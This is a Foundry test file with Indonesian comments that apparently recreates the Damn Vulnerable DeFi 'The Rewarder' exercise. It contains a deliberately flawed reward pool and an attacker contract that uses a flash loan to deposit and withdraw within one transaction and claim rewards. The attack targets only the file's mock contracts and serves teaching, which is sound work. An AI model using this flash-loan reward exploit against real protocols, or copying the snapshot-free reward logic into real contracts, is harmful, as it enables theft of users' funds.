// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- MOCK CONTRACTS (Disederhanakan) ---

// 1. Token DVT & Reward Token
contract DamnValuableToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) public { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance too low");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "Not enough funds");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
}

// 2. FLASH LOAN POOL (Tempat pinjam uang)
contract FlashLoanerPool {
    DamnValuableToken public liquidityToken;
    constructor(address _token) { liquidityToken = DamnValuableToken(_token); }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        liquidityToken.transfer(msg.sender, amount);
        
        // Callback ke peminjam
        (bool success, ) = msg.sender.call(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));
        require(success, "External call failed");

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "FlashLoan not repaid");
    }
}

// 3. THE REWARDER POOL (Target Serangan)
contract TheRewarderPool {
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    mapping(address => uint256) public accToken; // Saldo deposit user
    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRewardTimestmap;

    constructor(address _token) {
        liquidityToken = DamnValuableToken(_token);
        rewardToken = new RewardToken();
        lastRewardTimestmap = block.timestamp;
    }

    function deposit(uint256 amount) external {
        liquidityToken.transferFrom(msg.sender, address(this), amount);
        accToken[msg.sender] += amount;
        distributeRewards(); // Cek apakah berhak dapat hadiah?
    }

    function withdraw(uint256 amount) external {
        accToken[msg.sender] -= amount;
        liquidityToken.transfer(msg.sender, amount);
    }

    function distributeRewards() public returns (uint256) {
        // Logika Sederhana: Kalau sudah lewat 5 hari, bagi-bagi hadiah!
        if (block.timestamp >= lastRewardTimestmap + 5 days) {
            uint256 reward = 0;
            if (accToken[msg.sender] > 0) {
                reward = 100 ether; // Anggaplah rewardnya fixed 100 token biar simpel
                rewardToken.mint(msg.sender, reward);
                lastRewardTimestmap = block.timestamp; // Reset waktu
            }
            return reward;
        }
        return 0;
    }
}

// --- ATTACKER CONTRACT & TEST ---

contract RewarderAttacker {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken dvt;
    RewardToken rewardToken;
    address owner;

    constructor(address _flashLoanPool, address _rewarderPool, address _dvt, address _rewardToken) {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        dvt = DamnValuableToken(_dvt);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function attack() external {
        // Pinjam 1 Juta DVT dari FlashLoan Pool
        uint256 totalLiquidity = dvt.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(totalLiquidity);
    }

    // Dipanggil saat Flash Loan cair
    function receiveFlashLoan(uint256 amount) external {
        // 1. Approve RewardPool biar bisa narik DVT kita
        dvt.approve(address(rewarderPool), amount);

        // 2. Deposit ke RewardPool (Ini akan memicu 'distributeRewards')
        rewarderPool.deposit(amount);

        // 3. Tarik lagi DVT-nya (Withdraw)
        rewarderPool.withdraw(amount);

        // 4. Kembalikan DVT ke FlashLoan Pool
        dvt.transfer(address(flashLoanPool), amount);

        // 5. Transfer Reward (HAPUS BAGIAN INI)
        // Kita biarkan reward tokennya tersimpan di kontrak ini saja.
        // Test script akan mengecek saldo kontrak ini.
    }
}

contract TheRewarderTest is Test {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken dvt;
    RewarderAttacker attacker;

    function setUp() public {
        dvt = new DamnValuableToken();
        flashLoanPool = new FlashLoanerPool(address(dvt));
        rewarderPool = new TheRewarderPool(address(dvt));

        // Setup Modal
        dvt.mint(address(flashLoanPool), 1_000_000 ether); // Bank punya 1 Juta
        
        // Deploy Attacker
        attacker = new RewarderAttacker(
            address(flashLoanPool), 
            address(rewarderPool), 
            address(dvt), 
            address(rewarderPool.rewardToken())
        );
    }

    function test_Rewarder_Attack() public {
        // Cek kondisi awal
        console.log("Current Time:", block.timestamp);
        
        // -----------------------------------------------------
        // TUGASMU: MANIPULASI WAKTU DI SINI!
        // Agar bisa dapat reward, kita harus menunggu 5 hari.
        // Gunakan cheatcode Foundry: vm.warp(...)
        // Majukan waktu sebanyak 5 hari (5 days).
        // -----------------------------------------------------

        // vm.warp(block.timestamp + ...);
        vm.warp(block.timestamp + 5 days);
        // -----------------------------------------------------

        // Jalankan serangan
        attacker.attack();

        // VERIFIKASI
        // Kita cek apakah kontrak attacker berhasil dapat RewardToken
        RewardToken rt = rewarderPool.rewardToken();
        console.log("Attacker Reward Balance:", rt.balanceOf(address(attacker)));
        
        assertGt(rt.balanceOf(address(attacker)), 0); // Harus lebih dari 0
    }
}